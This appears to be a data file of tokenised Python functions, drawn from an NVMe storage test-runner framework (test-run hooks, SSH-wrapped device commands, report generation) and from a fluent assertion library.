def trun_emph ( trun ) : if trun [ "conf" ] [ "VERBOSE" ] > 1 : # Print environment variables cij . emph ( "rnr:CONF {" ) for cvar in sorted ( trun [ "conf" ] . keys ( ) ) : cij . emph ( "  % 16s: %r" % ( cvar , trun [ "conf" ] [ cvar ] ) ) cij . emph ( "}" ) if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:INFO {" ) cij . emph ( "  OUTPUT: %r" % trun [ "conf" ] [ "OUTPUT" ] ) cij . emph ( "  yml_fpath: %r" % yml_fpath ( trun [ "conf" ] [ "OUTPUT" ] ) ) cij . emph ( "}" )
def tcase_setup ( trun , parent , tcase_fname ) : #pylint: disable=locally-disabled, unused-argument case = copy . deepcopy ( TESTCASE ) case [ "fname" ] = tcase_fname case [ "fpath_orig" ] = os . sep . join ( [ trun [ "conf" ] [ "TESTCASES" ] , case [ "fname" ] ] ) if not os . path . exists ( case [ "fpath_orig" ] ) : cij . err ( 'rnr:tcase_setup: !case["fpath_orig"]: %r' % case [ "fpath_orig" ] ) return None case [ "name" ] = os . path . splitext ( case [ "fname" ] ) [ 0 ] case [ "ident" ] = "/" . join ( [ parent [ "ident" ] , case [ "fname" ] ] ) case [ "res_root" ] = os . sep . join ( [ parent [ "res_root" ] , case [ "fname" ] ] ) case [ "aux_root" ] = os . sep . join ( [ case [ "res_root" ] , "_aux" ] ) case [ "log_fpath" ] = os . sep . join ( [ case [ "res_root" ] , "run.log" ] ) case [ "fpath" ] = os . sep . join ( [ case [ "res_root" ] , case [ "fname" ] ] ) case [ "evars" ] . update ( copy . deepcopy ( parent [ "evars" ] ) ) # Initalize os . makedirs ( case [ "res_root" ] ) # Create DIRS os . makedirs ( case [ "aux_root" ] ) shutil . copyfile ( case [ "fpath_orig" ] , case [ "fpath" ] ) # Copy testcase # Initialize hooks case [ "hooks" ] = hooks_setup ( trun , case , parent . get ( "hooks_pr_tcase" ) ) return case
def tsuite_exit ( trun , tsuite ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:exit" ) rcode = 0 for hook in reversed ( tsuite [ "hooks" ] [ "exit" ] ) : # EXIT-hooks rcode = script_run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:exit { rcode: %r } " % rcode , rcode ) return rcode
def tsuite_enter ( trun , tsuite ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:enter { name: %r }" % tsuite [ "name" ] ) rcode = 0 for hook in tsuite [ "hooks" ] [ "enter" ] : # ENTER-hooks rcode = script_run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:tsuite:enter { rcode: %r } " % rcode , rcode ) return rcode
def trun_exit ( trun ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun:exit" ) rcode = 0 for hook in reversed ( trun [ "hooks" ] [ "exit" ] ) : # EXIT-hooks rcode = script_run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun::exit { rcode: %r }" % rcode , rcode ) return rcode
def trun_enter ( trun ) : if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun::enter" ) trun [ "stamp" ] [ "begin" ] = int ( time . time ( ) ) # Record start timestamp rcode = 0 for hook in trun [ "hooks" ] [ "enter" ] : # ENTER-hooks rcode = script_run ( trun , hook ) if rcode : break if trun [ "conf" ] [ "VERBOSE" ] : cij . emph ( "rnr:trun::enter { rcode: %r }" % rcode , rcode ) return rcode
def main ( conf ) : fpath = yml_fpath ( conf [ "OUTPUT" ] ) if os . path . exists ( fpath ) : # YAML exists, we exit, it might be RUNNING! cij . err ( "main:FAILED { fpath: %r }, exists" % fpath ) return 1 trun = trun_setup ( conf ) # Construct 'trun' from 'conf' if not trun : return 1 trun_to_file ( trun ) # Persist trun trun_emph ( trun ) # Print trun before run tr_err = 0 tr_ent_err = trun_enter ( trun ) for tsuite in ( ts for ts in trun [ "testsuites" ] if not tr_ent_err ) : ts_err = 0 ts_ent_err = tsuite_enter ( trun , tsuite ) for tcase in ( tc for tc in tsuite [ "testcases" ] if not ts_ent_err ) : tc_err = tcase_enter ( trun , tsuite , tcase ) if not tc_err : tc_err += script_run ( trun , tcase ) tc_err += tcase_exit ( trun , tsuite , tcase ) tcase [ "status" ] = "FAIL" if tc_err else "PASS" trun [ "progress" ] [ tcase [ "status" ] ] += 1 # Update progress trun [ "progress" ] [ "UNKN" ] -= 1 ts_err += tc_err # Accumulate errors trun_to_file ( trun ) # Persist trun if not ts_ent_err : ts_err += tsuite_exit ( trun , tsuite ) ts_err += ts_ent_err # Accumulate errors tr_err += ts_err tsuite [ "status" ] = "FAIL" if ts_err else "PASS" cij . emph ( "rnr:tsuite %r" % tsuite [ "status" ] , tsuite [ "status" ] != "PASS" ) if not tr_ent_err : trun_exit ( trun ) tr_err += tr_ent_err trun [ "status" ] = "FAIL" if tr_err else "PASS" trun [ "stamp" ] [ "end" ] = int ( time . time ( ) ) + 1 # END STAMP trun_to_file ( trun ) # PERSIST cij . emph ( "rnr:main:progress %r" % trun [ "progress" ] ) cij . emph ( "rnr:main:trun %r" % trun [ "status" ] , trun [ "status" ] != "PASS" ) return trun [ "progress" ] [ "UNKN" ] + trun [ "progress" ] [ "FAIL" ]
def get_chunk_meta ( self , meta_file ) : chunks = self . envs [ "CHUNKS" ] if cij . nvme . get_meta ( 0 , chunks * self . envs [ "CHUNK_META_SIZEOF" ] , meta_file ) : raise RuntimeError ( "cij.liblight.get_chunk_meta: fail" ) chunk_meta = cij . bin . Buffer ( types = self . envs [ "CHUNK_META_STRUCT" ] , length = chunks ) chunk_meta . read ( meta_file ) return chunk_meta
def get_chunk_meta_item ( self , chunk_meta , grp , pug , chk ) : num_chk = self . envs [ "NUM_CHK" ] num_pu = self . envs [ "NUM_PU" ] index = grp * num_pu * num_chk + pug * num_chk + chk return chunk_meta [ index ]
def is_bad_chunk ( self , chunk_meta , grp , pug , chk ) : meta = self . get_chunk_meta_item ( chunk_meta , grp , pug , chk ) if meta . CS & 0x8 != 0 : return True return False
def s20_to_gen ( self , pugrp , punit , chunk , sectr ) : cmd = [ "nvm_addr s20_to_gen" , self . envs [ "DEV_PATH" ] , "%d %d %d %d" % ( pugrp , punit , chunk , sectr ) ] status , stdout , _ = cij . ssh . command ( cmd , shell = True ) if status : raise RuntimeError ( "cij.liblight.s20_to_gen: cmd fail" ) return int ( re . findall ( r"val: ([0-9a-fx]+)" , stdout ) [ 0 ] , 16 )
def gen_to_dev ( self , address ) : cmd = [ "nvm_addr gen2dev" , self . envs [ "DEV_PATH" ] , "0x{:x}" . format ( address ) ] status , stdout , _ = cij . ssh . command ( cmd , shell = True ) if status : raise RuntimeError ( "cij.liblight.gen_to_dev: cmd fail" ) return int ( re . findall ( r"dev: ([0-9a-fx]+)" , stdout ) [ 0 ] , 16 )
def start ( self ) : self . __thread = Thread ( target = self . __run , args = ( True , False ) ) self . __thread . setDaemon ( True ) self . __thread . start ( )
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.pci.env: invalid SSH environment" ) return 1 pci = cij . env_to_dict ( PREFIX , REQUIRED ) pci [ "BUS_PATH" ] = "/sys/bus/pci" pci [ "DEV_PATH" ] = os . sep . join ( [ pci [ "BUS_PATH" ] , "devices" , pci [ "DEV_NAME" ] ] ) cij . env_export ( PREFIX , EXPORTED , pci ) return 0
def info ( txt ) : print ( "%s# %s%s%s" % ( PR_EMPH_CC , get_time_stamp ( ) , txt , PR_NC ) ) sys . stdout . flush ( )
def good ( txt ) : print ( "%s# %s%s%s" % ( PR_GOOD_CC , get_time_stamp ( ) , txt , PR_NC ) ) sys . stdout . flush ( )
def warn ( txt ) : print ( "%s# %s%s%s" % ( PR_WARN_CC , get_time_stamp ( ) , txt , PR_NC ) ) sys . stdout . flush ( )
def err ( txt ) : print ( "%s# %s%s%s" % ( PR_ERR_CC , get_time_stamp ( ) , txt , PR_NC ) ) sys . stdout . flush ( )
def emph ( txt , rval = None ) : if rval is None : # rval is not specified, use 'neutral' info ( txt ) elif rval == 0 : # rval is 0, by convention, this is 'good' good ( txt ) else : # any other value, considered 'bad' err ( txt )
def paths_from_env ( prefix = None , names = None ) : def expand_path ( path ) : """Expands variables in 'path' and turns it into absolute path""" return os . path . abspath ( os . path . expanduser ( os . path . expandvars ( path ) ) ) if prefix is None : prefix = "CIJ" if names is None : names = [ "ROOT" , "ENVS" , "TESTPLANS" , "TESTCASES" , "TESTSUITES" , "MODULES" , "HOOKS" , "TEMPLATES" ] conf = { v : os . environ . get ( "_" . join ( [ prefix , v ] ) ) for v in names } for env in ( e for e in conf . keys ( ) if e [ : len ( prefix ) ] in names and conf [ e ] ) : conf [ env ] = expand_path ( conf [ env ] ) if not os . path . exists ( conf [ env ] ) : err ( "%s_%s: %r, does not exist" % ( prefix , env , conf [ env ] ) ) return conf
def env_export ( prefix , exported , env ) : for exp in exported : ENV [ "_" . join ( [ prefix , exp ] ) ] = env [ exp ]
def env ( ) : if cij . ssh . env ( ) : cij . err ( "cij.nvm.env: invalid SSH environment" ) return 1 nvm = cij . env_to_dict ( PREFIX , REQUIRED ) if "nvme" in nvm [ "DEV_NAME" ] : nvm [ "DEV_PATH" ] = "/dev/%s" % nvm [ "DEV_NAME" ] else : nvm [ "DEV_PATH" ] = "traddr:%s" % nvm [ "DEV_NAME" ] cij . env_export ( PREFIX , EXPORTED , nvm ) return 0
def exists ( ) : if env ( ) : cij . err ( "cij.nvm.exists: Invalid NVMe ENV." ) return 1 nvm = cij . env_to_dict ( PREFIX , EXPORTED + REQUIRED ) cmd = [ '[[ -b "%s" ]]' % nvm [ "DEV_PATH" ] ] rcode , _ , _ = cij . ssh . command ( cmd , shell = True , echo = False ) return rcode
def pkill ( ) : if env ( ) : return 1 cmd = [ "ps -aux | grep fio | grep -v grep" ] status , _ , _ = cij . ssh . command ( cmd , shell = True , echo = False ) if not status : status , _ , _ = cij . ssh . command ( [ "pkill -f fio" ] , shell = True ) if status : return 1 return 0
def __parse_parms ( self ) : args = list ( ) for key , val in self . __parm . items ( ) : key = key . replace ( "FIO_" , "" ) . lower ( ) if key == "runtime" : args . append ( "--time_based" ) if val is None : args . append ( "--%s" % key ) else : args . append ( "--%s=%s" % ( key , val ) ) return args
def import_parms ( self , args ) : for key , val in args . items ( ) : self . set_parm ( key , val )
def get_parm ( self , key ) : if key in self . __parm . keys ( ) : return self . __parm [ key ] return None
def start ( self ) : self . __thread = Threads ( target = self . run , args = ( True , True , False ) ) self . __thread . setDaemon ( True ) self . __thread . start ( )
def extract_hook_names ( ent ) : hnames = [ ] for hook in ent [ "hooks" ] [ "enter" ] + ent [ "hooks" ] [ "exit" ] : hname = os . path . basename ( hook [ "fpath_orig" ] ) hname = os . path . splitext ( hname ) [ 0 ] hname = hname . strip ( ) hname = hname . replace ( "_enter" , "" ) hname = hname . replace ( "_exit" , "" ) if hname in hnames : continue hnames . append ( hname ) hnames . sort ( ) return hnames
def tcase_parse_descr ( tcase ) : descr_short = "SHORT" descr_long = "LONG" try : comment = tcase_comment ( tcase ) except ( IOError , OSError , ValueError ) as exc : comment = [ ] cij . err ( "tcase_parse_descr: failed: %r, tcase: %r" % ( exc , tcase ) ) comment = [ l for l in comment if l . strip ( ) ] # Remove empty lines for line_number , line in enumerate ( comment ) : if line . startswith ( "#" ) : comment [ line_number ] = line [ 1 : ] if comment : descr_short = comment [ 0 ] if len ( comment ) > 1 : descr_long = "\n" . join ( comment [ 1 : ] ) return descr_short , descr_long
def process_tsuite ( tsuite ) : # scoop of output from all run-logs tsuite [ "log_content" ] = runlogs_to_html ( tsuite [ "res_root" ] ) tsuite [ "aux_list" ] = aux_listing ( tsuite [ "aux_root" ] ) tsuite [ "hnames" ] = extract_hook_names ( tsuite ) return True
def process_tcase ( tcase ) : tcase [ "src_content" ] = src_to_html ( tcase [ "fpath" ] ) tcase [ "log_content" ] = runlogs_to_html ( tcase [ "res_root" ] ) tcase [ "aux_list" ] = aux_listing ( tcase [ "aux_root" ] ) tcase [ "descr_short" ] , tcase [ "descr_long" ] = tcase_parse_descr ( tcase ) tcase [ "hnames" ] = extract_hook_names ( tcase ) return True
def process_trun ( trun ) : trun [ "log_content" ] = runlogs_to_html ( trun [ "res_root" ] ) trun [ "aux_list" ] = aux_listing ( trun [ "aux_root" ] ) trun [ "hnames" ] = extract_hook_names ( trun ) return True
def postprocess ( trun ) : plog = [ ] plog . append ( ( "trun" , process_trun ( trun ) ) ) for tsuite in trun [ "testsuites" ] : plog . append ( ( "tsuite" , process_tsuite ( tsuite ) ) ) for tcase in tsuite [ "testcases" ] : plog . append ( ( "tcase" , process_tcase ( tcase ) ) ) for task , success in plog : if not success : cij . err ( "rprtr::postprocess: FAILED for %r" % task ) return sum ( ( success for task , success in plog ) )
def rehome ( old , new , struct ) : if old == new : return if isinstance ( struct , list ) : for item in struct : rehome ( old , new , item ) elif isinstance ( struct , dict ) : for key , val in struct . iteritems ( ) : if isinstance ( val , ( dict , list ) ) : rehome ( old , new , val ) elif "conf" in key : continue elif "orig" in key : continue elif "root" in key or "path" in key : struct [ key ] = struct [ key ] . replace ( old , new )
def env ( ) : ssh = cij . env_to_dict ( PREFIX , REQUIRED ) if "KEY" in ssh : ssh [ "KEY" ] = cij . util . expand_path ( ssh [ "KEY" ] ) if cij . ENV . get ( "SSH_PORT" ) is None : cij . ENV [ "SSH_PORT" ] = "22" cij . warn ( "cij.ssh.env: SSH_PORT was not set, assigned: %r" % ( cij . ENV . get ( "SSH_PORT" ) ) ) if cij . ENV . get ( "SSH_CMD_TIME" ) is None : cij . ENV [ "SSH_CMD_TIME" ] = "1" cij . warn ( "cij.ssh.env: SSH_CMD_TIME was not set, assigned: %r" % ( cij . ENV . get ( "SSH_CMD_TIME" ) ) ) return 0
def wait ( timeout = 300 ) : if env ( ) : cij . err ( "cij.ssh.wait: Invalid SSH environment" ) return 1 timeout_backup = cij . ENV . get ( "SSH_CMD_TIMEOUT" ) try : time_start = time . time ( ) cij . ENV [ "SSH_CMD_TIMEOUT" ] = "3" while True : time_current = time . time ( ) if ( time_current - time_start ) > timeout : cij . err ( "cij.ssh.wait: Timeout" ) return 1 status , _ , _ = command ( [ "exit" ] , shell = True , echo = False ) if not status : break cij . info ( "cij.ssh.wait: Time elapsed: %d seconds" % ( time_current - time_start ) ) finally : if timeout_backup is None : del cij . ENV [ "SSH_CMD_TIMEOUT" ] else : cij . ENV [ "SSH_CMD_TIMEOUT" ] = timeout_backup return 0
def assert_that ( val , description = '' ) : global _soft_ctx if _soft_ctx : return AssertionBuilder ( val , description , 'soft' ) return AssertionBuilder ( val , description )
def is_equal_to ( self , other , * * kwargs ) : if self . _check_dict_like ( self . val , check_values = False , return_as_bool = True ) and self . _check_dict_like ( other , check_values = False , return_as_bool = True ) : if self . _dict_not_equal ( self . val , other , ignore = kwargs . get ( 'ignore' ) , include = kwargs . get ( 'include' ) ) : self . _dict_err ( self . val , other , ignore = kwargs . get ( 'ignore' ) , include = kwargs . get ( 'include' ) ) else : if self . val != other : self . _err ( 'Expected <%s> to be equal to <%s>, but was not.' % ( self . val , other ) ) return self
def is_not_equal_to ( self , other ) : if self . val == other : self . _err ( 'Expected <%s> to be not equal to <%s>, but was.' % ( self . val , other ) ) return self
def is_same_as ( self , other ) : if self . val is not other : self . _err ( 'Expected <%s> to be identical to <%s>, but was not.' % ( self . val , other ) ) return self
def is_not_same_as ( self , other ) : if self . val is other : self . _err ( 'Expected <%s> to be not identical to <%s>, but was.' % ( self . val , other ) ) return self
def is_type_of ( self , some_type ) : if type ( some_type ) is not type and not issubclass ( type ( some_type ) , type ) : raise TypeError ( 'given arg must be a type' ) if type ( self . val ) is not some_type : if hasattr ( self . val , '__name__' ) : t = self . val . __name__ elif hasattr ( self . val , '__class__' ) : t = self . val . __class__ . __name__ else : t = 'unknown' self . _err ( 'Expected <%s:%s> to be of type <%s>, but was not.' % ( self . val , t , some_type . __name__ ) ) return self
def is_instance_of ( self , some_class ) : try : if not isinstance ( self . val , some_class ) : if hasattr ( self . val , '__name__' ) : t = self . val . __name__ elif hasattr ( self . val , '__class__' ) : t = self . val . __class__ . __name__ else : t = 'unknown' self . _err ( 'Expected <%s:%s> to be instance of class <%s>, but was not.' % ( self . val , t , some_class . __name__ ) ) except TypeError : raise TypeError ( 'given arg must be a class' ) return self
def is_length ( self , length ) : if type ( length ) is not int : raise TypeError ( 'given arg must be an int' ) if length < 0 : raise ValueError ( 'given arg must be a positive int' ) if len ( self . val ) != length : self . _err ( 'Expected <%s> to be of length <%d>, but was <%d>.' % ( self . val , length , len ( self . val ) ) ) return self
def contains ( self , * items ) : if len ( items ) == 0 : raise ValueError ( 'one or more args must be given' ) elif len ( items ) == 1 : if items [ 0 ] not in self . val : if self . _check_dict_like ( self . val , return_as_bool = True ) : self . _err ( 'Expected <%s> to contain key <%s>, but did not.' % ( self . val , items [ 0 ] ) ) else : self . _err ( 'Expected <%s> to contain item <%s>, but did not.' % ( self . val , items [ 0 ] ) ) else : missing = [ ] for i in items : if i not in self . val : missing . append ( i ) if missing : if self . _check_dict_like ( self . val , return_as_bool = True ) : self . _err ( 'Expected <%s> to contain keys %s, but did not contain key%s %s.' % ( self . val , self . _fmt_items ( items ) , '' if len ( missing ) == 0 else 's' , self . _fmt_items ( missing ) ) ) else : self . _err ( 'Expected <%s> to contain items %s, but did not contain %s.' % ( self . val , self . _fmt_items ( items ) , self . _fmt_items ( missing ) ) ) return self
def does_not_contain ( self , * items ) : if len ( items ) == 0 : raise ValueError ( 'one or more args must be given' ) elif len ( items ) == 1 : if items [ 0 ] in self . val : self . _err ( 'Expected <%s> to not contain item <%s>, but did.' % ( self . val , items [ 0 ] ) ) else : found = [ ] for i in items : if i in self . val : found . append ( i ) if found : self . _err ( 'Expected <%s> to not contain items %s, but did contain %s.' % ( self . val , self . _fmt_items ( items ) , self . _fmt_items ( found ) ) ) return self
def contains_only ( self , * items ) : if len ( items ) == 0 : raise ValueError ( 'one or more args must be given' ) else : extra = [ ] for i in self . val : if i not in items : extra . append ( i ) if extra : self . _err ( 'Expected <%s> to contain only %s, but did contain %s.' % ( self . val , self . _fmt_items ( items ) , self . _fmt_items ( extra ) ) ) missing = [ ] for i in items : if i not in self . val : missing . append ( i ) if missing : self . _err ( 'Expected <%s> to contain only %s, but did not contain %s.' % ( self . val , self . _fmt_items ( items ) , self . _fmt_items ( missing ) ) ) return self
def contains_sequence ( self , * items ) : if len ( items ) == 0 : raise ValueError ( 'one or more args must be given' ) else : try : for i in xrange ( len ( self . val ) - len ( items ) + 1 ) : for j in xrange ( len ( items ) ) : if self . val [ i + j ] != items [ j ] : break else : return self except TypeError : raise TypeError ( 'val is not iterable' ) self . _err ( 'Expected <%s> to contain sequence %s, but did not.' % ( self . val , self . _fmt_items ( items ) ) )
def contains_duplicates ( self ) : try : if len ( self . val ) != len ( set ( self . val ) ) : return self except TypeError : raise TypeError ( 'val is not iterable' ) self . _err ( 'Expected <%s> to contain duplicates, but did not.' % self . val )
def does_not_contain_duplicates ( self ) : try : if len ( self . val ) == len ( set ( self . val ) ) : return self except TypeError : raise TypeError ( 'val is not iterable' ) self . _err ( 'Expected <%s> to not contain duplicates, but did.' % self . val )
def is_empty ( self ) : if len ( self . val ) != 0 : if isinstance ( self . val , str_types ) : self . _err ( 'Expected <%s> to be empty string, but was not.' % self . val ) else : self . _err ( 'Expected <%s> to be empty, but was not.' % self . val ) return self
def is_not_empty ( self ) : if len ( self . val ) == 0 : if isinstance ( self . val , str_types ) : self . _err ( 'Expected not empty string, but was empty.' ) else : self . _err ( 'Expected not empty, but was empty.' ) return self
def is_in ( self , * items ) : if len ( items ) == 0 : raise ValueError ( 'one or more args must be given' ) else : for i in items : if self . val == i : return self self . _err ( 'Expected <%s> to be in %s, but was not.' % ( self . val , self . _fmt_items ( items ) ) )
def is_less_than ( self , other ) : self . _validate_compareable ( other ) if self . val >= other : if type ( self . val ) is datetime . datetime : self . _err ( 'Expected <%s> to be less than <%s>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , other . strftime ( '%Y-%m-%d %H:%M:%S' ) ) ) else : self . _err ( 'Expected <%s> to be less than <%s>, but was not.' % ( self . val , other ) ) return self
def is_between ( self , low , high ) : val_type = type ( self . val ) self . _validate_between_args ( val_type , low , high ) if self . val < low or self . val > high : if val_type is datetime . datetime : self . _err ( 'Expected <%s> to be between <%s> and <%s>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , low . strftime ( '%Y-%m-%d %H:%M:%S' ) , high . strftime ( '%Y-%m-%d %H:%M:%S' ) ) ) else : self . _err ( 'Expected <%s> to be between <%s> and <%s>, but was not.' % ( self . val , low , high ) ) return self
def is_close_to ( self , other , tolerance ) : self . _validate_close_to_args ( self . val , other , tolerance ) if self . val < ( other - tolerance ) or self . val > ( other + tolerance ) : if type ( self . val ) is datetime . datetime : tolerance_seconds = tolerance . days * 86400 + tolerance . seconds + tolerance . microseconds / 1000000 h , rem = divmod ( tolerance_seconds , 3600 ) m , s = divmod ( rem , 60 ) self . _err ( 'Expected <%s> to be close to <%s> within tolerance <%d:%02d:%02d>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , other . strftime ( '%Y-%m-%d %H:%M:%S' ) , h , m , s ) ) else : self . _err ( 'Expected <%s> to be close to <%s> within tolerance <%s>, but was not.' % ( self . val , other , tolerance ) ) return self
def is_equal_to_ignoring_case ( self , other ) : if not isinstance ( self . val , str_types ) : raise TypeError ( 'val is not a string' ) if not isinstance ( other , str_types ) : raise TypeError ( 'given arg must be a string' ) if self . val . lower ( ) != other . lower ( ) : self . _err ( 'Expected <%s> to be case-insensitive equal to <%s>, but was not.' % ( self . val , other ) ) return self
def contains_ignoring_case ( self , * items ) : if len ( items ) == 0 : raise ValueError ( 'one or more args must be given' ) if isinstance ( self . val , str_types ) : if len ( items ) == 1 : if not isinstance ( items [ 0 ] , str_types ) : raise TypeError ( 'given arg must be a string' ) if items [ 0 ] . lower ( ) not in self . val . lower ( ) : self . _err ( 'Expected <%s> to case-insensitive contain item <%s>, but did not.' % ( self . val , items [ 0 ] ) ) else : missing = [ ] for i in items : if not isinstance ( i , str_types ) : raise TypeError ( 'given args must all be strings' ) if i . lower ( ) not in self . val . lower ( ) : missing . append ( i ) if missing : self . _err ( 'Expected <%s> to case-insensitive contain items %s, but did not contain %s.' % ( self . val , self . _fmt_items ( items ) , self . _fmt_items ( missing ) ) ) elif isinstance ( self . val , Iterable ) : missing = [ ] for i in items : if not isinstance ( i , str_types ) : raise TypeError ( 'given args must all be strings' ) found = False for v in self . val : if not isinstance ( v , str_types ) : raise TypeError ( 'val items must all be strings' ) if i . lower ( ) == v . lower ( ) : found = True break if not found : missing . append ( i ) if missing : self . _err ( 'Expected <%s> to case-insensitive contain items %s, but did not contain %s.' % ( self . val , self . _fmt_items ( items ) , self . _fmt_items ( missing ) ) ) else : raise TypeError ( 'val is not a string or iterable' ) return self
def starts_with ( self , prefix ) : if prefix is None : raise TypeError ( 'given prefix arg must not be none' ) if isinstance ( self . val , str_types ) : if not isinstance ( prefix , str_types ) : raise TypeError ( 'given prefix arg must be a string' ) if len ( prefix ) == 0 : raise ValueError ( 'given prefix arg must not be empty' ) if not self . val . startswith ( prefix ) : self . _err ( 'Expected <%s> to start with <%s>, but did not.' % ( self . val , prefix ) ) elif isinstance ( self . val , Iterable ) : if len ( self . val ) == 0 : raise ValueError ( 'val must not be empty' ) first = next ( iter ( self . val ) ) if first != prefix : self . _err ( 'Expected %s to start with <%s>, but did not.' % ( self . val , prefix ) ) else : raise TypeError ( 'val is not a string or iterable' ) return self
def ends_with ( self , suffix ) : if suffix is None : raise TypeError ( 'given suffix arg must not be none' ) if isinstance ( self . val , str_types ) : if not isinstance ( suffix , str_types ) : raise TypeError ( 'given suffix arg must be a string' ) if len ( suffix ) == 0 : raise ValueError ( 'given suffix arg must not be empty' ) if not self . val . endswith ( suffix ) : self . _err ( 'Expected <%s> to end with <%s>, but did not.' % ( self . val , suffix ) ) elif isinstance ( self . val , Iterable ) : if len ( self . val ) == 0 : raise ValueError ( 'val must not be empty' ) last = None for last in self . val : pass if last != suffix : self . _err ( 'Expected %s to end with <%s>, but did not.' % ( self . val , suffix ) ) else : raise TypeError ( 'val is not a string or iterable' ) return self
def matches ( self , pattern ) : if not isinstance ( self . val , str_types ) : raise TypeError ( 'val is not a string' ) if not isinstance ( pattern , str_types ) : raise TypeError ( 'given pattern arg must be a string' ) if len ( pattern ) == 0 : raise ValueError ( 'given pattern arg must not be empty' ) if re . search ( pattern , self . val ) is None : self . _err ( 'Expected <%s> to match pattern <%s>, but did not.' % ( self . val , pattern ) ) return self
def is_alpha ( self ) : if not isinstance ( self . val , str_types ) : raise TypeError ( 'val is not a string' ) if len ( self . val ) == 0 : raise ValueError ( 'val is empty' ) if not self . val . isalpha ( ) : self . _err ( 'Expected <%s> to contain only alphabetic chars, but did not.' % self . val ) return self
def is_digit ( self ) : if not isinstance ( self . val , str_types ) : raise TypeError ( 'val is not a string' ) if len ( self . val ) == 0 : raise ValueError ( 'val is empty' ) if not self . val . isdigit ( ) : self . _err ( 'Expected <%s> to contain only digits, but did not.' % self . val ) return self
def is_lower ( self ) : if not isinstance ( self . val , str_types ) : raise TypeError ( 'val is not a string' ) if len ( self . val ) == 0 : raise ValueError ( 'val is empty' ) if self . val != self . val . lower ( ) : self . _err ( 'Expected <%s> to contain only lowercase chars, but did not.' % self . val ) return self
def is_upper ( self ) : if not isinstance ( self . val , str_types ) : raise TypeError ( 'val is not a string' ) if len ( self . val ) == 0 : raise ValueError ( 'val is empty' ) if self . val != self . val . upper ( ) : self . _err ( 'Expected <%s> to contain only uppercase chars, but did not.' % self . val ) return self
def is_unicode ( self ) : if type ( self . val ) is not unicode : self . _err ( 'Expected <%s> to be unicode, but was <%s>.' % ( self . val , type ( self . val ) . __name__ ) ) return self
def is_subset_of ( self , * supersets ) : if not isinstance ( self . val , Iterable ) : raise TypeError ( 'val is not iterable' ) if len ( supersets ) == 0 : raise ValueError ( 'one or more superset args must be given' ) missing = [ ] if hasattr ( self . val , 'keys' ) and callable ( getattr ( self . val , 'keys' ) ) and hasattr ( self . val , '__getitem__' ) : # flatten superset dicts superdict = { } for l , j in enumerate ( supersets ) : self . _check_dict_like ( j , check_values = False , name = 'arg #%d' % ( l + 1 ) ) for k in j . keys ( ) : superdict . update ( { k : j [ k ] } ) for i in self . val . keys ( ) : if i not in superdict : missing . append ( { i : self . val [ i ] } ) # bad key elif self . val [ i ] != superdict [ i ] : missing . append ( { i : self . val [ i ] } ) # bad val if missing : self . _err ( 'Expected <%s> to be subset of %s, but %s %s missing.' % ( self . val , self . _fmt_items ( superdict ) , self . _fmt_items ( missing ) , 'was' if len ( missing ) == 1 else 'were' ) ) else : # flatten supersets superset = set ( ) for j in supersets : try : for k in j : superset . add ( k ) except Exception : superset . add ( j ) for i in self . val : if i not in superset : missing . append ( i ) if missing : self . _err ( 'Expected <%s> to be subset of %s, but %s %s missing.' % ( self . val , self . _fmt_items ( superset ) , self . _fmt_items ( missing ) , 'was' if len ( missing ) == 1 else 'were' ) ) return self
def contains_value ( self , * values ) : self . _check_dict_like ( self . val , check_getitem = False ) if len ( values ) == 0 : raise ValueError ( 'one or more value args must be given' ) missing = [ ] for v in values : if v not in self . val . values ( ) : missing . append ( v ) if missing : self . _err ( 'Expected <%s> to contain values %s, but did not contain %s.' % ( self . val , self . _fmt_items ( values ) , self . _fmt_items ( missing ) ) ) return self
def does_not_contain_value ( self , * values ) : self . _check_dict_like ( self . val , check_getitem = False ) if len ( values ) == 0 : raise ValueError ( 'one or more value args must be given' ) else : found = [ ] for v in values : if v in self . val . values ( ) : found . append ( v ) if found : self . _err ( 'Expected <%s> to not contain values %s, but did contain %s.' % ( self . val , self . _fmt_items ( values ) , self . _fmt_items ( found ) ) ) return self
def contains_entry ( self , * args , * * kwargs ) : self . _check_dict_like ( self . val , check_values = False ) entries = list ( args ) + [ { k : v } for k , v in kwargs . items ( ) ] if len ( entries ) == 0 : raise ValueError ( 'one or more entry args must be given' ) missing = [ ] for e in entries : if type ( e ) is not dict : raise TypeError ( 'given entry arg must be a dict' ) if len ( e ) != 1 : raise ValueError ( 'given entry args must contain exactly one key-value pair' ) k = next ( iter ( e ) ) if k not in self . val : missing . append ( e ) # bad key elif self . val [ k ] != e [ k ] : missing . append ( e ) # bad val if missing : self . _err ( 'Expected <%s> to contain entries %s, but did not contain %s.' % ( self . val , self . _fmt_items ( entries ) , self . _fmt_items ( missing ) ) ) return self
def is_before ( self , other ) : if type ( self . val ) is not datetime . datetime : raise TypeError ( 'val must be datetime, but was type <%s>' % type ( self . val ) . __name__ ) if type ( other ) is not datetime . datetime : raise TypeError ( 'given arg must be datetime, but was type <%s>' % type ( other ) . __name__ ) if self . val >= other : self . _err ( 'Expected <%s> to be before <%s>, but was not.' % ( self . val . strftime ( '%Y-%m-%d %H:%M:%S' ) , other . strftime ( '%Y-%m-%d %H:%M:%S' ) ) ) return self
def exists ( self ) : if not isinstance ( self . val , str_types ) : raise TypeError ( 'val is not a path' ) if not os . path . exists ( self . val ) : self . _err ( 'Expected <%s> to exist, but was not found.' % self . val ) return self
def is_file ( self ) : self . exists ( ) if not os . path . isfile ( self . val ) : self . _err ( 'Expected <%s> to be a file, but was not.' % self . val ) return self
def is_directory ( self ) : self . exists ( ) if not os . path . isdir ( self . val ) : self . _err ( 'Expected <%s> to be a directory, but was not.' % self . val ) return self
